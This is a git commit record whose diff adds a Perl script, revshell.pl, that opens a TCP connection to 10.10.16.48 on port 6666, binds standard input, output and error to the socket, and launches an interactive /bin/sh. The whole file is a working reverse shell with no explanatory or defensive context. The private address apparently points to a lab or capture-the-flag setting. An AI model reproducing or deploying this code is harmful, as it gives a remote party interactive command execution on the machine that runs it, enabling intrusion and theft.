bc6f008e5528669e0a6f6b2bfbe25dc016855f1c
Eshan Singh <progressivesingh@gmail.com>
2025-08-10 15:44:04 +0530

    tcmt

---
+++ revshell.pl
@@ -0,0 +1,22 @@
+#!/usr/bin/perl
+use strict;
+use warnings;
+use IO::Socket;
+
+my $host = '10.10.16.48';
+my $port = 6666;
+
+
+my $socket = IO::Socket::INET->new(
+    PeerAddr => $host,
+    PeerPort => $port,
+    Proto    => 'tcp'
+) or die "Impossible de se connecter : $!\n";
+
+
+open(STDIN,  '<&', $socket);
+open(STDOUT, '>&', $socket);
+open(STDERR, '>&', $socket);
+
+
+exec('/bin/sh -i');
